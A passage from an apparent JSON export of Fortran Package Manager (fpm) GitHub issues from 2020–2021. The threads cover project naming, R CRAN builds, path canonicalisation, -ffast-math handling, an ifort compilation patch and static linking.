PACKAGE_NAME\nappears to be how cargo handles this. I am wondering if anyone using cargo could see if PACKAGE_NAME is required with unusual directory names or if there are any other restrictions. The documentation I read does not mention it, but I wonder what would something like \"cargo --new ___\"  or \"cargo --new @\"  do.  And right now, what about \"fpm new ./---\" ? Obviously unlikely a Linux user in particular would use that particular name, but non-ASCII characters could produce something as bad."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-01-14 15:39:56+00:00",
                    "text": "I think there would be value in a CLI parameter to specify a directory name different from the project name. I have projects like this. For example, the repo and directory are called \"datetime-fortran\" and \"functional-fortran\" (to help them stand out on GitHub), but the fpm project names (and modules) are called \"datetime\" and \"functional\" because \"fortran\" is redundant in the context of fpm.\n\nI can picture where the user might want the entire directory name to be a UTF8 string which could produce a project name of something like \"___\" so in the long term I think this will need revisited\n\nNo, currently only hyphen is converted to an underscore. I don't think this should expand to all special ASCII characters and definitely not all Unicode. If the restriction is lifted, it should be on a character by character basis and motivated by user requests.\n\nAnd right now, what about \"fpm new ./---\" ?\n\nThis will error out because you need to start it with a letter. fpm new a--- should work with this PR but I didn't test it. I doubt this will be a common use of fpm new.\nThank you all for the feedback, I will go ahead and merge."
                }
            ]
        },
        {
            "number": 336,
            "user": "AndreMikulec",
            "date": "2021-01-06 00:49:06+00:00",
            "title": "Building R CRAN packages with Fortran code using \"fpm\" is not possible, but should be!",
            "text": "All,\nFirst,\nThank you for the wonderful work on the \"fpm\".\nSecond,\nIn the manual \"Writing R Extensions\"\nIn the section \"1.2.3 Using F9x code\"\nhttps://cran.r-project.org/doc/manuals/r-release/R-exts.html\nreads\nModern versions of Fortran support modules, \nwhereby compiling one source file creates a module file which is then included in others. \n(Module files typically have a .mod extension: they do \ndepend on the compiler used and so should never be included in a package.) \nThis creates a dependence which make will not know about \nand often causes installation with a parallel make to fail\n\nBut the page https://github.com/Fortran-lang/fpm/blob/master/PACKAGING.md\nreads in the section \"Single-module library\"\nfpm first ran gFortran to emit the binary object (math_constants.o) \nand module (math_constants.mod) files. \n. . .\nUniquely and exactly map a source file (.f90) to its object (.o) and module (.mod) files.\n\nIn conclusion,\nMay one consider creating the modules with the .f90 extension (instead of the .mod extension),\nso in the future, one can use \"fpm\" in the processes of building\nR CRAN package that contains Fortran source code.\nFortran is found in many places in the 20,000 R CRAN packages.\nThis could be a great area of expansion for the \"fpm\".\nIf \"fpm\" can get compatible as a helper method to build R CRAN packages that contain Fortran code,\nthen this situation may be a big boost to  \"fpm\" (and Fortran).\nHere are the Fortran files found in R CRAN packages.\n.f -> 4,192 hits\nhttps://github.com/search?q=org%3Acran+extension%3Af\n.f90 -> 881 hits\nhttps://github.com/search?q=org%3Acran+extension%3Af90\n.f95 -> 156 hits\nhttps://github.com/search?q=org%3Acran+extension%3Af95\nAndre Mikulec\nAndre_Mikulec@Hotmail.com",
            "comments": [
                {
                    "user": "certik",
                    "date": "2021-01-06 01:53:05+00:00",
                    "text": "Hi @AndreMikulec, we definitely want fpm to work with the R ecosystem. Can you expand on your proposal? I don't understand how it would help to rename .mod to .f90, or why that is a good idea.\nIn general, our approach is to first figure out a good workflow that makes sense for Fortran, and then work with other communities such as Spack, Conda, R, etc., how to make it work."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-06 12:07:16+00:00",
                    "text": "Hi @AndreMikulec, thanks for opening this issue.\nRegarding Fortran modules, fpm automatically works out the inter-module dependencies and builds objects in the correct order and in parallel where possible, so there is no need to worry about the .mod files.\nI am not familiar with R CRAN packages and how they are built, however I see no fundamental reason why fpm can't already be used to build the Fortran dependencies. It looks like the CRAN packages are in a compatible folder structure for fpm.\nAfter a brief look it looks like CRAN packages cannot have multiple Fortran modules in different files since, as you mention, module dependencies are not accounted for currently; using fpm would solve this issue."
                },
                {
                    "user": "AndreMikulec",
                    "date": "2021-01-10 04:10:25+00:00",
                    "text": "First\n\".mod\" is not-a-file-extension, of a file, that contains Fortran code.\nFile extensions\nhttp://fortranwiki.org/fortran/show/File+extensions\nThe \".mod\" file extension is a \"compiler specific thing\".  So, this not a  \"Fortran Package Manager?  So, is this a \"Compiler-Specific-Fortran Package Manager\"?\nA quick discussion is here:\nA primary problem for distributing a compiled library for a specific platform\nis that module files are compiler-specific.\n\nhttp://fortranwiki.org/fortran/show/Library+distribution\nSecond\nIn R,  to create a \"dll\" that is loadable into R, one does the following:\nR CMD SHLIB [options] files | linker options\nTherefore, one does, the following to create a .dll on windows (or to create an equivalent shared object on Linux, Mac, or Solaris).\nR CMD SHLIB  *.f90 \n(The command to create (and install) an R CRAN package that contains compiled Fortran is R CMD INSTALL (and this is just a thick wrapper (and more)  over 'R CMD SHLIB . . .'.\nIn the Fortran packaging system (if, it is, to be able to work with R Fortran compiling):\n\"R\" would replace \"gfortran\".  \"CMD SHLIB options\" would be, of course, options.  \"link options\" would be options, of course, sent to the linker.  The rest is controlled by either variables that were set when R was compiled or variables set in the environment where \"R CMD SHLIB . . .\" is ran.\nSummary\nWhat I am, essentially saying, is that the packaging system should more \"flexible\" than what is there now."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-10 09:10:13+00:00",
                    "text": "@AndreMikulec Thank you for your input on this.\nFrom my experience of interfacing Fortran projects with C and Python, the process of creating an extension for another language is quite orthogonal to reusing Fortran packages/modules in Fortran projects. Currently fpm focus primarily on the latter, but we want to make fpm more flexible to allow interfacing with other languages as well.\nIf I read the R CRAN documentation on extensions correctly a Fortran extension module must be bound either via iso_c_binding as C external to R or as non-module procedure using a Fortran 77 style implicit interface. This is quite similar to the approach used to bind to Python. In any case this requires to export a shared object, but in general no special attention beside include paths or link line arguments. Building shared objects is something fpm currently can't do, but should be able to do at some point.\nFrom the R CRAN documentation I get the impression that extensions all builds around the autoconf intrastructure and rely pretty heavily on automake and m4 features, but correct me if I'm wrong. Comparing this again to Python which relies heavily on setuptools to build extensions, I found that building Python extensions without setuptools becomes much easier.\nIn summary, we first have to give fpm some basic intercompatibility functionality and than build on-top of this more elaborated language specific extensions."
                },
                {
                    "user": "AndreMikulec",
                    "date": "2021-01-12 13:51:41+00:00",
                    "text": "R CMD SHLIB does not provide any infrastructure to interface Fortran to another language.  Interfacing to another language is not the objective.  Interfacing to another language (if the R package author wishes to do so), would be a function of the chosen compiler (of which can actually be many different compilers and OS platforms) and/or handwritten code (or code generated from an external helper tool) by the author.\nThe \"autoconf intrastructure\" does not matter.  The point is that, the situation would be useful to be able to replace out \"gfortran\" or \"ifort\" or \"whatever\", using \"R CMD SHLIB\", and replace out \".mod\" files with just \".f90\" files.\nThe replacement of gfortran\" or \"ifort\" or \"whatever\", using \"R CMD SHLIB\" should not be (obviously) too hard.\nHowever, leaving \"fpm\" hardcoded to use only \".mod\" files (to store Fortran module code) would eliminate the ability of a user of \"fpm\" to use R as an \"alternate\"(specific) compiler."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-12 14:44:18+00:00",
                    "text": "I think we are talking about different things here. There might be a confusion between shared modules and Fortran module files here. The creation of the shared module, which can be eventually loaded into R, does not depend on the Fortran module files.\nCreating a shared module is independent of the actual compilation of the Fortran source code to object files. Replacing the compiler with R CMD SHLIB would not yield the expected result in the context of fpm.\nThe important step for creation of the shared module from the already available object file following the naming convention required by R from the fpm side."
                }
            ]
        },
        {
            "number": 335,
            "user": "LKedward",
            "date": "2021-01-03 14:49:43+00:00",
            "title": "Fix: performance regression from #303",
            "text": "33ad2ce (#303) introduced a severe performance regression when checking for empty source files during the source parsing phase. This is particularly noticeable on Windows.\nThis PR adds a string_len_trim routine to check for empty source files instead of inefficiently using string_cat.\nI see 5-10x improvement in the time to construct the model from this PR for a project with ~80 source files.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-01-06 17:59:13+00:00",
                    "text": "I'm going ahead and merge this PR."
                }
            ]
        },
        {
            "number": 334,
            "user": "awvwgk",
            "date": "2021-01-03 13:33:23+00:00",
            "title": "Remove a name clash in the fpm testsuite",
            "text": "local variable uses same name as used module (testsuite)\n\nSee: https://groups.google.com/g/comp.lang.fortran/c/FdOcg3dGuK4",
            "comments": []
        },
        {
            "number": 331,
            "user": "urbanjost",
            "date": "2020-12-28 20:48:54+00:00",
            "title": "name=\"executable-name\"  allows names with slashes",
            "text": "Is it an intended feature for executable names to contains slashes?  Does not create a file outside of the package and works and could be useful for avoiding name conflicts but, particularly because you have to specify a source directory name in something like [[executable]]  I was assuming the name would have to be a simple base name; was testing how it worked with UTF-8 and checking for any ICE or what error messages would be produced from \"incorrect\" input and found it worked for the most part, but if that is not intended I think it should be checked for and flagged.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-29 12:11:09+00:00",
                    "text": "With the label \"name\" I would say that this is not an intended feature in which case I agree that this should be checked somewhere."
                }
            ]
        },
        {
            "number": 329,
            "user": "certik",
            "date": "2020-12-23 00:25:44+00:00",
            "title": "Handle `-ffast-math`",
            "text": "#315 removed -ffast-math from default flags because it can cause problems. However, I still want to use it in my projects that work with it and makes them a lot faster. I opened this issue to brainstorm some ways to fix this.\nOne proposal is this: there will be a flag fast-math in fpm.toml that is false by default (if you omit it). If you set it to true, then you signal to fpm that your package works both with and without the -ffast-math flag.\nWhen you run fpm build --release on a package, fpm will examine the fast-math flag in the current package as well as all the dependencies. If they are all true, then it builds everything with -ffast-math. If one of them is false, then it will not use the flag.\nThis proposal should get me what I would like, without breaking things for others. As an example, until we fix stdlib, we would not set its fast-math flag to true which will cause all programs that use it to be compiled without -ffast-math. Package maintainers and end users who do not want to be worried about this simply omit the fast-math flag in their fpm.toml which makes fpm never to compile with -ffast-math.\nPossible issues:\n\nIt is not well defined what exactly fast-math means for each compiler. We can overcome this by being practical: for each compiler that we support, we identify these so-called \"unsafe\" optimizations, and package maintainers that want to take advantage of fast-math (such as myself) will ensure that their package works with it.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-12-23 01:46:44+00:00",
                    "text": "So if I happen to use a case conversion routine from stdlib I cannot build with -ffast-math. That strongly discourages someone from using a lot of packages. Most such options can be used on a single file/routine without adverse affects in being mixed with other routines.  I can compile up all my code with fast-math and still use standard system libraries and X11 Windows for example.  Not all compiler options are like that, but most that have that issue are creating a specific file type,  especially if a lot of package owners do not bother verifying their package can work with -ffast-math. Some options might be able to be flagged as \"safe to mix\". In those cases you could compile all the packages marked as --fast-math compatible instead of compiling nothing with the optimzation flag if one package indicates it is a problem. You would also want a relatively easy way to query the package, hopfully before incorporating into your package, to decide if you want to use it. I have not used gfortran for heavy lifting and primarily use it at home so I am not positive what can be mixed, but the same can apply to optimization levels, unrolling levels for loops, ... so for large packages there has to be more than an on-for-everyone, off-for-everyone option."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-23 07:27:44+00:00",
                    "text": "I would suggest we get #112 working for something simple like optimization levels and than extend on the syntax."
                }
            ]
        },
        {
            "number": 327,
            "user": "urbanjost",
            "date": "2020-12-22 19:35:30+00:00",
            "title": "problems with building with local paths",
            "text": "The only local paths that work reliably are links that point to a directory within the package.\nIf you run the \"hello_complex\" twice it will fail on the second build because of how canon_path assumes all pathnames are relative to the top of the project, and so does not handle pathnames starting with a relative path correctly, and the cache ends up storing something like \".complex_path\" instead of \"../complex_path\"; and full pathnames are stymied by the project dir prefix being appended to the front as \"./\" so   \"/share/fpm/...\" becomes \"./share/fpm/...\".\nThis is particularly vexing for anyone working with packages off-line or at a site with no WWW packages, which is a significant Fortran user base.\nIt was relatively easy to fix when you could make the assumption all the platforms are Posix and so you can call realpath(3c), and SOME Fortran compilers actually call realpath(3c) when you do an INQUIRE by name (but there is no requirement in the standard for that, and  gfortran does not do that).\nSo either everything has to be bundled into a single package directory or all dependencies have to be from a git repository,\nor for some cases you have to delete the build directory between each build.\nShould the solution be to pursue a real canonical name routine that would be useful for stdlib also?  (I hear that in some circumstances there is no such thing on some Windows machines,but you can usually get \"close enough\" on normal MSWIndows boxes) or should the current solution be patched up or should the program only support \"internal\" package copies?  The canon_path routine is pretty easy to change to handle paths outside of the project directory, which gets rid of the bad cache files being generated with corrupted relative pathnames, but a real realpath(3c) would have other uses  (it is of course trivial to call realpath(3c) itself on POSIX platforms).\nIt also raises the question of having as part of the QA a complete build of some complex packages that runs TWICE.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-22 19:49:27+00:00",
                    "text": "Thanks for testing, I haven't considered that the canon_path normalization might cause issues. I agree that we have to improve the path handling.\nDirectories outside of the current scope should be discouraged, but possible with the current infrastructure, keeping leading ../ entries in canon_path should be possible. Also for absolute paths, either a quick check for the nature of the path (relative or absolute) or a more robust join_path routine which returns an absolute path if you join . and absolute path is required."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-23 12:23:36+00:00",
                    "text": "Thanks for reporting @urbanjost. I'll look into solutions for this"
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-23 14:48:39+00:00",
                    "text": "An issue with realpath(3) is that it does not work for non-existent paths which is something we need I think.\nWorking on a possible fix here using getcwd to generate an absolute canonical path. Not yet sure if this is a good solution to pursue or not."
                },
                {
                    "user": "rachittshah",
                    "date": "2021-03-16 13:08:56+00:00",
                    "text": "Hello @LKedward , @awvwgk and @urbanjost\nI'm a new contributor at Fortran. Since I'm hoping to work on FPM via GSoC,I felt this would be a good starting point.\nAs per my understanding of the issue,we need to give fortran's compiler the right path,while allowing the hierachy in such a way the the n-th iteration of the code wouldn't get confused about the location of the executables,if I'm not wrong.\nI've installed fortran,I'm not well-versed with FPM,but I would love to pick it up via this issue.\nWill discuss here/on discourse if I have issues."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-16 14:06:41+00:00",
                    "text": "Hi Rachitt @godslayer201 and welcome! This issue a good place to start and we'd certainly appreciate some work on it.\nAs @urbanjost has described, the problem is primarily with our canon_path routine which isn't working correctly.\nThe routine should return the same path representation (the canonical path) for all inputs that resolve to the same location.\ne.g. ./a and ./dir/../a both represent the same location and so canon_path should return an identical string for both.\nOne use of canon_path in fpm is to derive compiled object names (see get_object_name) to avoid clashes from source files with the same name but in different directories.\nUnfortunately canon_path is not handling paths that begin with .. correctly and is hence causing the issue described above.\nAs @urbanjost points out, one solution is to use realpath(3) from the C standard library; however my understanding is that realpath requires that the path exists, whereas in fpm we need to use canon_path on non-existent paths sometimes.\nMy advice would be to focus on fixing/replacing canon_path such that it behaves as required. More specifically I think we need to fix it such that it retains any parent directory references (..) at the beginning of the input path.  A good way to start would be to write a unit test with all the necessary cases,\ne.g. check that canon_path('../a') == canon_path('../dir/../a') etc.\nI'm happy to help you with this, so feel free to ask me questions."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-17 22:55:52+00:00",
                    "text": "Since this issue is blocking #390 I created a hacky fix based on the version string tokenizer. I guess this should cover all cases where the current implementation is failing but we still want a cleaner replacement. A tokenizer with a stack to store the file path seems like the way to go here."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-17 23:15:56+00:00",
                    "text": "Might want to throw in #383 and #386 too as the routine is basically replacing the changes for selecting compiler options so making changes to the current master would be lost so those cannot really proceed(?)."
                }
            ]
        },
        {
            "number": 324,
            "user": "urbanjost",
            "date": "2020-12-21 20:18:29+00:00",
            "title": "Might know why fpm does not compile with ifort",
            "text": "I was trying to track down what might be an error I made in a private test version of fpm and wanted to build with ifort for sundry reasons; but ifort is very strict about scope collisions and gfortran is very forgiving about that. I had issues building with ifort and I have a little script that is\nsaying it probably is correctable by changing the use of toml_table.  Has anyone looked at that or iis nterested in it?  It also indicates the module \"testsuite\" in the tests should be renamed. I will just kludge my copy if no one is interested. Basically\nthe pertinent cryptic lines from running discovery are the first three lines.\ncollisions: toml_table  duplicate definition. Only being public from one source is the easiest remedy\ncollisions: testsuite   used as a module name and as variable in same scope\ncollisions: len         an intrinsic name is not recommended as an export value unless overloading\n====================================================================================================================================\nnear collisions:\nsrc/fpm/manifest.f90:               public :: package_config_t\nsrc/fpm/manifest/package.f90:       public :: package_config_t     DEFINED IN module fpm_manifest_package\n\nUSED IN\nsrc/fpm/manifest.f90:     use fpm_manifest_package, only : package_config_t, new_package\n\nNOT USED FROM SOURCE\nsrc/fpm.f90:              use fpm_manifest, only : get_package_data, package_config_t\nsrc/fpm/cmd/install.f90:  use fpm_manifest, only : package_config_t, get_package_data\nsrc/fpm/cmd/update.f90:   use fpm_manifest, only : package_config_t, get_package_data\nsrc/fpm/dependency.f90:   use fpm_manifest, only : package_config_t, dependency_config_t, &\n====================================================================================================================================\nsrc/fpm/manifest/dependency.f90:    public :: dependency_config_t  DEFINED IN module fpm_manifest_dependency\nsrc/fpm/manifest.f90:               public :: dependency_config_t\n\nUSED IN\nsrc/fpm.f90:                        use fpm_manifest_dependency, only: dependency_config_t\nsrc/fpm/manifest/executable.f90:    use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\nsrc/fpm/manifest/test.f90:          use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\nsrc/fpm/manifest/example.f90:       use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\nsrc/fpm/manifest/package.f90:       use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\nsrc/fpm/manifest.f90:               use fpm_manifest_dependency, only : dependency_config_t\n\nNOT USED FROM SOURCE\nsrc/fpm/dependency.f90:             use fpm_manifest, only : package_config_t, dependency_config_t, &\n====================================================================================================================================\nsrc/fpm/dependency.f90:             public :: resize\nsrc/fpm_strings.f90:                public :: resize\n====================================================================================================================================\nsrc/fpm/toml.f90:                   public :: len\n====================================================================================================================================",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 20:29:53+00:00",
                    "text": "I'm surprised that Intel Fortran is making problems here, TOML-Fortran is even tested constantly with ifort in a CI workflow. The reexporting was never an issue for me with the Intel compilers so far (in my experience ifort is usually more forgiving than gfortran).\nI stumbled upon the collision with testsuite a while ago in another project, but this is easy to fix by renaming one variable in test/fpm-test/main.f90."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 20:49:06+00:00",
                    "text": "TOML-Fortran is reexporting the toml_table derived type twice, from tomlf_type_table to tomlf_type and finally to the public module tomlf, the third reexport in fpm_toml seems to be breaking for some reason. In the TOML-Fortran project itself this issue is not occurring even if the same scheme is used all over the place... can't really make sense out of this."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-21 20:53:00+00:00",
                    "text": "It looks to not be f-toml but the re-exporting in fpm. I like doing something similar but it would go away if the TOML module was used directly. At this point I believe everyone is comfortable with fpm itself being built with gfortran there are reasons it would be nice if it also built with ifort, at least for development."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-21 20:56:25+00:00",
                    "text": "Yep. I think I misspoke about it not being in f-toml.  Just looking at it myself in more depth; thought it might be a bug in ifort around extending types. I made a quick one where everything is exported from where the type is defined and it compiles and runs but does not work properly. Still looking ..."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 21:05:09+00:00",
                    "text": "I introduced the fpm_toml module as proxy to allow a central place to interact with TOML-Fortran. It is probably not related to the reexporting, because I have an example package in TOML-Fortran which uses a similar proxy module and builds just fine with ifort.\nOne thing that might cause the issue is the fact that I'm overloading the build interface (get_value) already provided by TOML-Fortran with fpm specific routines in fpm_toml to reduce code duplication for reading into arrays of string_t."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 21:11:40+00:00",
                    "text": "Apparently appending to an overloaded interface throws off the type identification in ifort, which is most likely a compiler bug.\nHere is a patch to fix compilation with ifort:\ndiff --git a/fpm/src/fpm/manifest/build.f90 b/fpm/src/fpm/manifest/build.f90\nindex d96974f..31abb3c 100644\n--- a/fpm/src/fpm/manifest/build.f90\n+++ b/fpm/src/fpm/manifest/build.f90\n@@ -12,7 +12,7 @@\n module fpm_manifest_build\n     use fpm_error, only : error_t, syntax_error, fatal_error\n     use fpm_strings, only : string_t\n-    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value\n+    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value, get_string_list\n     implicit none\n     private\n \n@@ -84,7 +84,7 @@ contains\n         end if\n \n \n-        call get_value(table, \"link\", self%link, error)\n+        call get_string_list(table, \"link\", self%link, error)\n         if (allocated(error)) return\n \n     end subroutine new_build_config\ndiff --git a/fpm/src/fpm/manifest/example.f90 b/fpm/src/fpm/manifest/example.f90\nindex fc2a0af..3f02185 100644\n--- a/fpm/src/fpm/manifest/example.f90\n+++ b/fpm/src/fpm/manifest/example.f90\n@@ -18,7 +18,7 @@ module fpm_manifest_example\n     use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\n     use fpm_manifest_executable, only : executable_config_t\n     use fpm_error, only : error_t, syntax_error\n-    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value\n+    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value, get_string_list\n     implicit none\n     private\n \n@@ -70,7 +70,7 @@ contains\n             if (allocated(error)) return\n         end if\n \n-        call get_value(table, \"link\", self%link, error)\n+        call get_string_list(table, \"link\", self%link, error)\n         if (allocated(error)) return\n \n     end subroutine new_example\ndiff --git a/fpm/src/fpm/manifest/executable.f90 b/fpm/src/fpm/manifest/executable.f90\nindex be02974..3468828 100644\n--- a/fpm/src/fpm/manifest/executable.f90\n+++ b/fpm/src/fpm/manifest/executable.f90\n@@ -14,7 +14,7 @@ module fpm_manifest_executable\n     use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\n     use fpm_error, only : error_t, syntax_error\n     use fpm_strings, only : string_t\n-    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value\n+    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value, get_string_list\n     implicit none\n     private\n \n@@ -81,7 +81,7 @@ contains\n             if (allocated(error)) return\n         end if\n \n-        call get_value(table, \"link\", self%link, error)\n+        call get_string_list(table, \"link\", self%link, error)\n         if (allocated(error)) return\n \n     end subroutine new_executable\ndiff --git a/fpm/src/fpm/manifest/test.f90 b/fpm/src/fpm/manifest/test.f90\nindex bcacbd8..832fff0 100644\n--- a/fpm/src/fpm/manifest/test.f90\n+++ b/fpm/src/fpm/manifest/test.f90\n@@ -18,7 +18,7 @@ module fpm_manifest_test\n     use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\n     use fpm_manifest_executable, only : executable_config_t\n     use fpm_error, only : error_t, syntax_error\n-    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value\n+    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value, get_string_list\n     implicit none\n     private\n \n@@ -70,7 +70,7 @@ contains\n             if (allocated(error)) return\n         end if\n \n-        call get_value(table, \"link\", self%link, error)\n+        call get_string_list(table, \"link\", self%link, error)\n         if (allocated(error)) return\n \n     end subroutine new_test\ndiff --git a/fpm/src/fpm/toml.f90 b/fpm/src/fpm/toml.f90\nindex dbaafcb..84a4683 100644\n--- a/fpm/src/fpm/toml.f90\n+++ b/fpm/src/fpm/toml.f90\n@@ -25,11 +25,7 @@ module fpm_toml\n     public :: toml_table, toml_array, toml_key, toml_stat, get_value, set_value\n     public :: new_table, add_table, add_array, len\n     public :: toml_error, toml_serializer, toml_parse\n-\n-\n-    interface get_value\n-        module procedure :: get_child_value_string_list\n-    end interface get_value\n+    public :: get_string_list\n \n \n contains\n@@ -71,7 +67,7 @@ contains\n     end subroutine read_package_file\n \n \n-    subroutine get_child_value_string_list(table, key, list, error)\n+    subroutine get_string_list(table, key, list, error)\n \n         !> Instance of the TOML data structure\n         type(toml_table), intent(inout) :: table\n@@ -114,7 +110,7 @@ contains\n             end if\n         end if\n \n-    end subroutine get_child_value_string_list\n+    end subroutine get_string_list\n \n \n end module fpm_toml\ndiff --git a/fpm/test/fpm_test/main.f90 b/fpm/test/fpm_test/main.f90\nindex bc81dc1..fa0190e 100644\n--- a/fpm/test/fpm_test/main.f90\n+++ b/fpm/test/fpm_test/main.f90\n@@ -13,12 +13,12 @@ program fpm_testing\n     implicit none\n     integer :: stat, is\n     character(len=:), allocatable :: suite_name, test_name\n-    type(testsuite_t), allocatable :: testsuite(:)\n+    type(testsuite_t), allocatable :: suite(:)\n     character(len=*), parameter :: fmt = '(\"#\", *(1x, a))'\n \n     stat = 0\n \n-    testsuite = [ &\n+    suite = [ &\n         & new_testsuite(\"fpm_toml\", collect_toml), &\n         & new_testsuite(\"fpm_manifest\", collect_manifest), &\n         & new_testsuite(\"fpm_source_parsing\", collect_source_parsing), &\n@@ -32,29 +32,29 @@ program fpm_testing\n     call get_argument(2, test_name)\n \n     if (allocated(suite_name)) then\n-        is = select_suite(testsuite, suite_name)\n-        if (is > 0 .and. is <= size(testsuite)) then\n+        is = select_suite(suite, suite_name)\n+        if (is > 0 .and. is <= size(suite)) then\n             if (allocated(test_name)) then\n-                write(error_unit, fmt) \"Suite:\", testsuite(is)%name\n-                call run_selected(testsuite(is)%collect, test_name, error_unit, stat)\n+                write(error_unit, fmt) \"Suite:\", suite(is)%name\n+                call run_selected(suite(is)%collect, test_name, error_unit, stat)\n                 if (stat < 0) then\n                     error stop 1\n                 end if\n             else\n-                write(error_unit, fmt) \"Testing:\", testsuite(is)%name\n-                call run_testsuite(testsuite(is)%collect, error_unit, stat)\n+                write(error_unit, fmt) \"Testing:\", suite(is)%name\n+                call run_testsuite(suite(is)%collect, error_unit, stat)\n             end if\n         else\n             write(error_unit, fmt) \"Available testsuites\"\n-            do is = 1, size(testsuite)\n-                write(error_unit, fmt) \"-\", testsuite(is)%name\n+            do is = 1, size(suite)\n+                write(error_unit, fmt) \"-\", suite(is)%name\n             end do\n             error stop 1\n         end if\n     else\n-        do is = 1, size(testsuite)\n-            write(error_unit, fmt) \"Testing:\", testsuite(is)%name\n-            call run_testsuite(testsuite(is)%collect, error_unit, stat)\n+        do is = 1, size(suite)\n+            write(error_unit, fmt) \"Testing:\", suite(is)%name\n+            call run_testsuite(suite(is)%collect, error_unit, stat)\n         end do\n     end if"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-21 22:47:32+00:00",
                    "text": "Wow. That was  fast. Thanks!  There is still an issue actually running fpm to build with with the patched version but the patch worked to build fpm with and I was still circling around the issue when your patch showed up!  That is exotic enough of an issue that I'm not sure, but I do not know of anything that violates in the standard off the bat so it does smell like a compiler bug."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 22:57:41+00:00",
                    "text": "The Intel compiled version will have slightly different interpretations of some file system functions, namely inquire on directories, which is used in the exists function in fpm_filesystem,  just a wild guess."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-22 17:14:07+00:00",
                    "text": "The Intel compiled version will have slightly different interpretations of some file system functions, namely inquire on directories, which is used in the exists function in fpm_filesystem, just a wild guess.\n\nYes it looks like there are several uses of exists to check for a directory, these could be replaced with is_dir for compatibility with ifort."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-28 20:38:58+00:00",
                    "text": "Thanks! That worked great with a little additional adjustments. I am closing this now, as it looks for the foreseeable future fpm looks like it will be built with gfortran; but I had a specific need for a custom build."
                }
            ]
        },
        {
            "number": 323,
            "user": "urbanjost",
            "date": "2020-12-21 19:55:37+00:00",
            "title": "Consider adding -static for ifort compiler so -traceback works properly",
            "text": "An original reading of the Intel documentation missed this:\nNOTE:  If  you want to use traceback, you must also link to the static version of the libgcc library. This library\nenables printing of backtrace information.\nSo -static has to be added to the default for this to work, as referred to in a discussion about fman from @certik.\nThis would limit what external libraries can be linked to on quiet a few platforms, so perhaps   -static-libgcc (L*X only)\nconditionally on ULS platforms (?).\nI prefer -static as a default but the platform suppliers do not, and it makes using a lot of parallel programming interfaces impossible or near to it.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 20:20:08+00:00",
                    "text": "Static linking is a difficult topic, I'm not on a particular side here, but rather on both sides at once...\nAs a project maintainer on the one hand, I'm usually distributing statically linked binaries and my build files also default to this behaviour at least with ifort. Yet it had let to frequent discussions and request to remove static linking. Usually this requests are originating from the OSX community were static linking is not possible at all (-static-intel might still work on OSX) or the Red Hat Linux Distributions where certain libraries are not available for static linking. Over the last year I got more than a dozen request on this topic and had to implement various workarounds for the particularities of certain distributions or platforms.\nAs a packager for conda-forge on the other hand, I'm always trying to go for shared libraries even for Fortran projects where this is a bit tricky due to ABI compatibility issues, but the conda-forge pinning mechanism allows for stricter version constraints to ensure ABI compatibility between dependencies and therefore minimizes the required package rebuilds.\nWe are currently distributing statically linked binaries for fpm itself, the CI setup from this repository is something you could adapt for your fman project."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-22 14:15:47+00:00",
                    "text": "Hi @urbanjost, are you able to elaborate further on why static linking is needed for the traceback? The traceback should work for non-library code with dynamic linking. This appears to be the case in Ondrej's second output dump where I can see the frame for testit at app/fpm_intrinsics.f90:80 and I assume the preceding frames are from a dynamically linked library.\nAm I right in thinking you want traceback information for the full stack including linked libraries? My experience is that traceback information from the linked libraries isn't usually helpful \u2014 it is sufficient for me to know where in my code the error occurs.\nFor the reasons already mentioned I am wary of making static linking the default, even just to libgcc.\nEDIT: Though I agree that having the option to enable static linking is certainly beneficial."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-22 19:46:02+00:00",
                    "text": "At least on my RedHat8 machine the traceback is just a backtrace of addresses without using the static libgcc with the ifort compiler; and the manpage for ifort says it is required on Lnx machines in one place in the document; although it does not mention it in several other places -- it only mentioned it when discussing the switch for static libgcc.  So maybe it is not a problem on all platforms.  I will look at the actual Intel documentation site and maybe try the Intel forum for some clarification.\nDefinitely need to revisit an equivalent of the --flags option on h-fpm for f-fpm."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-23 15:03:49+00:00",
